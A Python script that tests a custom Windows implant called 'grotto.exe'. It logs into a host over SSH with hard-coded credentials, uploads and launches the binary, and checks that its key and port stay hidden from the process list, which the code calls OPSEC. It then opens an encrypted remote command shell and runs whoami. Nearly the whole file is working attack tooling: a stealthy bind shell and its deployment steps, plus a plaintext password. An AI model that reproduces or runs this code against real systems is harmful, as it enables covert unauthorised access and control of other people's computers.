#!/usr/bin/env python3
"""Test baked Windows binary on remote target — no CLI args, nothing in process list."""
import paramiko
import socket
import struct
import time
import secrets

from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

TARGET = "192.168.123.147"
USER = "Eric.Wallows"
PASS = "EricLikesRunning800"
KEY = bytes.fromhex("41" * 32)
PORT = 48901

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(TARGET, username=USER, password=PASS, timeout=10)
print("[+] Connected to target")

# Cleanup and upload
ssh.exec_command("taskkill /IM grotto.exe /F 2>nul", timeout=5)
time.sleep(1)

sftp = ssh.open_sftp()
local = r"C:\Users\Matt\Notes\Projects\netcat\build\grotto.exe"
remote = "C:/Users/Eric.Wallows/Desktop/grotto.exe"
try:
    sftp.put(local, remote)
    print("[+] Uploaded baked grotto.exe")
except OSError:
    tmp = "C:/Users/Eric.Wallows/Desktop/grotto_tmp.exe"
    sftp.put(local, tmp)
    ssh.exec_command("del C:\\Users\\Eric.Wallows\\Desktop\\grotto.exe 2>nul", timeout=5)
    time.sleep(1)
    ssh.exec_command("move /Y C:\\Users\\Eric.Wallows\\Desktop\\grotto_tmp.exe C:\\Users\\Eric.Wallows\\Desktop\\grotto.exe", timeout=5)
    time.sleep(1)
    print("[+] Uploaded baked grotto.exe (via rename)")
sftp.close()

# Start baked listener — NO ARGUMENTS
print("[*] Starting baked listener (no args)...")
transport = ssh.get_transport()
chan = transport.open_session()
chan.settimeout(5)
chan.exec_command('"C:\\Users\\Eric.Wallows\\Desktop\\grotto.exe"')
time.sleep(3)

if chan.exit_status_ready():
    ec = chan.recv_exit_status()
    print(f"[FAIL] Listener exited: 0x{ec & 0xFFFFFFFF:08X}")
    ssh.close()
    exit(1)

print("[+] Baked listener running")

# Check process list for OPSEC
stdin, stdout, stderr = ssh.exec_command(
    'wmic process where "name=\'grotto.exe\'" get CommandLine /format:list', timeout=10)
cmdline = stdout.read().decode(errors='replace').strip()
print(f"[*] Process command line: {cmdline!r}")
if "4141" not in cmdline and "-k" not in cmdline and "-p" not in cmdline:
    print("[PASS] No key/port/flags visible in process list")
else:
    print("[FAIL] Config visible in process list!")

# Connect and test encrypted shell
print("[*] Connecting to baked listener...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((TARGET, PORT))
print("[+] Connected")

# Drain cmd.exe banner
time.sleep(2)
try:
    hdr = sock.recv(4)
    if hdr:
        plen = struct.unpack("<I", hdr)[0]
        data = b""
        while len(data) < plen:
            data += sock.recv(plen - len(data))
        banner = ChaCha20Poly1305(KEY).decrypt(data[:12], data[12:], None)
        print(f"[*] Banner: {banner.decode(errors='replace')[:100]!r}")
except socket.timeout:
    pass

# Send whoami
nonce = secrets.token_bytes(12)
ct = ChaCha20Poly1305(KEY).encrypt(nonce, b"whoami\r\n", None)
payload = nonce + ct
sock.sendall(struct.pack("<I", len(payload)) + payload)

time.sleep(3)
hdr = sock.recv(4)
plen = struct.unpack("<I", hdr)[0]
data = b""
while len(data) < plen:
    data += sock.recv(plen - len(data))
pt = ChaCha20Poly1305(KEY).decrypt(data[:12], data[12:], None)
result = pt.decode(errors='replace').strip()
print(f"[*] whoami: {result!r}")

if "eric" in result.lower() or "wallows" in result.lower():
    print("[PASS] Baked Windows shell works!")
else:
    print(f"[INFO] Got response but unexpected: {result!r}")

sock.close()
ssh.exec_command("taskkill /IM grotto.exe /F 2>nul", timeout=5)
ssh.close()
print("[+] Done")
